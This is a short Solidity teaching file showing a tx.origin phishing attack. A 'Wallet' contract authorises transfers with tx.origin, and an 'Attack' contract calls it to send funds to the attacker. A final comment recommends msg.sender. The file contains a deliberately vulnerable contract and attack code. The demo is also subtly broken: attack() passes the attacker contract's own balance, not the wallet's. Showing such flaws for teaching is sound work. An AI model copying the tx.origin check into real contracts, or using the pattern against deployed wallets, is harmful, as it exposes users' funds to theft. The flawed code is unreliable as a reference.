pragma solidity >=0.5.0 < 0.9.0;


//alice contract
contract Wallet 
{
   address payable public owner;

   constructor()payable
   {
    owner=payable(msg.sender);
   }

   function transfer(address payable _to,uint amount)public payable
   {
    require(tx.origin==owner,"Only Owner can Call");
    (bool sent,)=_to.call{value:amount}("");
    require(sent);
   }

   function getBalanace()public view returns(uint)
   {
    return address(this).balance;
   }

}



//hacker contract
contract Attack
{
    address payable public  owner;
    Wallet public wallet;

    constructor(address _wallet)
    {
        wallet=Wallet(_wallet);
        owner=payable(msg.sender);
    }
    

    //if hacker some what manages to call transfer function using alice the amount will be tranfered
    // if(alice) ->calls->Attack.attack()(contract deployed bye hacker(owner)) then transfer take places
    function attack()public 
    {
        wallet.transfer(owner,address(this).balance);
    }
}

//Always use msg.sender instead of tx.origin